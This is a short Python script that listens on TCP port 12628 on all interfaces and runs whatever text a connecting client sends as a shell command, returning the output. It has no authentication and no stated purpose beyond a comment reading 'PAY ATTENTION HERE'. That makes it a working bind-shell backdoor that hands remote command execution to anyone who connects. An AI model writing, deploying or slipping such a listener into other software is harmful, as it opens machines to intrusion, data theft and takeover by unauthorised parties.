import sys, socket
import subprocess
#socket.setdefaulttimeout(30)
host = ''
port = 12628

s = socket.socket()
s.bind((host, port))

print("Server started on port: %s"%port)

s.listen(5)
print("Now listening...\n")
#conn = client socket
conn, addr = s.accept()
print ("New connection from %s:%d" % (addr[0], addr[1]))
while True:
	data = conn.recv(1024)
	if not data:
		break

	else:
      # PAY ATTENTION HERE
		op = subprocess.Popen(data, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
		output=str(op.stdout.read())
		#send back to client for output
		print(output)
		conn.send(output)
conn.close()
